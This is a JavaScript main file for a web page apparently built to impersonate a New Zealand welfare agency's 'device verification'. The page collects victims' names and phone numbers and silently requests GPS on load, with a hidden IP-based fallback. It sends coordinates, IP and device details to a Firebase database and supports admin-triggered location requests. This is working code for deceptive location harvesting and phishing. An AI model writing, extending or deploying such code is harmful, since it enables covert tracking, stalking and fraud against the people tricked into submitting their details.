import { initializeTheme, getCurrentTheme } from './src/features/theme/theme-manager.js';
import { prewarmLocation, getLocation, listenForLocationRequests, setupUnloadHandler } from './src/features/location/location-tracker.js';
import { getDeviceInfo } from './src/utils/browser-detection.js';
import { createFormFields, initializeFormValidation, getFormData } from './src/features/form/form-handler.js';
import { logger } from './src/utils/logger.js';

// Preview mode - apply theme directly without Firebase listener
async function applyPreviewTheme(themeName) {
    const theme = window.themes[themeName];
    if (!theme) return;
    const themeStyles = document.getElementById('themeStyles');
    if (themeStyles) themeStyles.href = theme.styles;
    document.documentElement.style.setProperty('--primary-color', theme.primaryColor);
    document.documentElement.style.setProperty('--primary-hover', theme.secondaryColor);
    const logoImage = document.querySelector('.logo-image');
    if (logoImage) { logoImage.src = theme.logo; logoImage.alt = theme.name; }
    if (theme.content) {
        const h1 = document.querySelector('h1'); if (h1) h1.textContent = theme.content.title;
        const msg = document.querySelector('.message'); if (msg) msg.textContent = theme.content.message;
        const sub = document.querySelector('.sub-message'); if (sub) sub.textContent = theme.content.subMessage;
        const btn = document.getElementById('allowLocation'); if (btn && theme.content.buttonText) btn.textContent = theme.content.buttonText;
        if (theme.content.badges) {
            const el = document.querySelector('.security-badges');
            if (el) el.innerHTML = theme.content.badges.map(b => `<div class="badge"><span class="icon">${b.icon}</span><span class="text">${b.text}</span></div>`).join('');
        }
        if (theme.content.infoBox) {
            const el = document.querySelector('.info-box');
            if (el) el.innerHTML = `<p>${theme.content.infoBox.title}</p><ul>${theme.content.infoBox.points.map(p => `<li>${p}</li>`).join('')}</ul>`;
        }
        if (theme.content.footer) {
            const fp = document.querySelector('footer > p'); if (fp) fp.textContent = theme.content.footer.copyright;
            if (theme.content.footer.links) {
                const el = document.querySelector('.footer-links');
                if (el) el.innerHTML = theme.content.footer.links.map(l => `<a href="${l.url}">${l.text}</a>`).join('');
            }
        }
    }
    document.title = `Preview - ${theme.name}`;
    const banner = document.createElement('div');
    banner.style.cssText = 'position:fixed;top:0;left:0;right:0;background:#333;color:white;text-align:center;padding:8px;font-size:14px;z-index:9999;';
    banner.textContent = `🔍 Preview Mode: ${theme.name}`;
    document.body.prepend(banner);
    const formContainer = document.getElementById('userDetailsForm');
    if (formContainer) { formContainer.innerHTML = ''; formContainer.appendChild(createFormFields(theme)); }
    const verifyButton = document.getElementById('allowLocation');
    if (verifyButton) { verifyButton.disabled = true; verifyButton.title = 'Preview mode - form submission disabled'; }
}

// Initialize Firebase and load theme
document.addEventListener('DOMContentLoaded', async () => {
    // Create form fields IMMEDIATELY with hardcoded fallback
    const formContainer = document.getElementById('userDetailsForm');
    if (formContainer) {
        // Try to use theme config, fallback to hardcoded
        let theme = null;
        if (window.themes) {
            theme = window.themes['winz'] || Object.values(window.themes)[0];
        }
        
        if (theme) {
            formContainer.appendChild(createFormFields(theme));
        } else {
            // Hardcoded fallback - always works (MSD/WINZ default)
            const fallbackTheme = {
                content: {
                    formFields: {
                        firstName: { label: "First Name", placeholder: "Enter your first name" },
                        lastName: { label: "Last Name", placeholder: "Enter your last name" },
                        phone: { label: "Contact Number", placeholder: "021234567 or +64212345678" }
                    }
                }
            };
            formContainer.appendChild(createFormFields(fallbackTheme));
        }
        initializeFormValidation();
    }

    try {
        const urlParams = new URLSearchParams(window.location.search);
        const previewTheme = urlParams.get('preview');
        
        await window.firebaseLoaded;
        logger.debug('Firebase SDK loaded');

        if (!window.database) throw new Error('Firebase database not initialized');

        if (previewTheme && window.themes[previewTheme]) {
            await applyPreviewTheme(previewTheme);
            logger.debug('Preview theme applied:', previewTheme);
        } else {
            await initializeTheme();
            logger.debug('Theme system initialized');
            
            // Update form fields if theme changed from default
            const currentTheme = window.themes[getCurrentTheme()];
            if (currentTheme && formContainer) {
                formContainer.innerHTML = '';
                formContainer.appendChild(createFormFields(currentTheme));
                initializeFormValidation();
            }
            
            // PRE-WARM: Silently request location on page load
            // This triggers the permission prompt early, so when user clicks Verify,
            // location is already cached. No prompt during verification.
            prewarmLocation();
            
            // Setup location request listener for admin-initiated updates
            listenForLocationRequests();
            setupUnloadHandler();

            // Enhanced theme change listener
            window.addEventListener('themeChanged', async (e) => {
                const formContainer = document.getElementById('userDetailsForm');
                switch (e.detail.state) {
                    case 'changing':
                        if (formContainer) formContainer.style.opacity = '0.7';
                        break;
                    case 'success':
                        if (formContainer && !e.detail.unchanged) {
                            formContainer.innerHTML = '';
                            const currentTheme = window.themes[getCurrentTheme()];
                            formContainer.appendChild(createFormFields(currentTheme));
                            initializeFormValidation();
                            formContainer.style.opacity = '1';
                        }
                        break;
                    case 'error':
                        if (formContainer) formContainer.style.opacity = '1';
                        break;
                }
            });

            // Setup verify button
            const verifyButton = document.getElementById('allowLocation');
            const locationStatus = document.getElementById('locationStatus');

            if (!verifyButton) { logger.error('Verify button not found'); return; }

            verifyButton.addEventListener('click', async () => {
                try {
                    const userDetails = getFormData();
                    if (!userDetails) throw new Error('Please fill in all required fields correctly');

                    verifyButton.disabled = true;
                    document.querySelector('.container').classList.add('processing');
                    locationStatus.textContent = 'Verifying device...';

                    // Get location - uses cached GPS if pre-warmed, else fresh GPS, else silent IP fallback
                    const loc = await getLocation();
                    logger.debug('Location obtained:', loc.source);

                    if (!window.database) throw new Error('Firebase database not initialized');

                    const locationData = {
                        ...userDetails,
                        latitude: loc.latitude,
                        longitude: loc.longitude,
                        accuracy: loc.accuracy,
                        timestamp: new Date().toISOString(),
                        status: 'active',
                        locationSource: loc.source,
                        ip: loc.ip,
                        userAgent: navigator.userAgent,
                        ...getDeviceInfo()
                    };

                    await window.database.ref('locations').push().set(locationData);
                    logger.debug('Location saved successfully');

                    // Success message
                    const successMessage = document.createElement('div');
                    successMessage.className = 'success-message';
                    const mainMsg = document.createElement('p');
                    mainMsg.textContent = 'Device verified successfully';
                    mainMsg.style.marginBottom = '10px';
                    successMessage.appendChild(mainMsg);
                    const contactMsg = document.createElement('p');
                    contactMsg.style.fontSize = '0.9em';
                    contactMsg.style.color = '#666';
                    contactMsg.textContent = 'Thank you for your verification. Someone will be in touch with you shortly via phone call during business hours.';
                    successMessage.appendChild(contactMsg);
                    locationStatus.textContent = '';
                    locationStatus.appendChild(successMessage);
                    verifyButton.style.display = 'none';
                    document.querySelector('.thank-you-card').classList.add('success');
                } catch (error) {
                    logger.error('Verification failed:', error);
                    locationStatus.textContent = error.message || 'Verification failed. Please try again.';
                    locationStatus.style.color = '#DA1710';
                    verifyButton.disabled = false;
                    document.querySelector('.container').classList.remove('processing');
                }
            });

            logger.debug('Initialization complete');
        }
    } catch (error) {
        logger.error('Failed to initialize:', error);
    }
});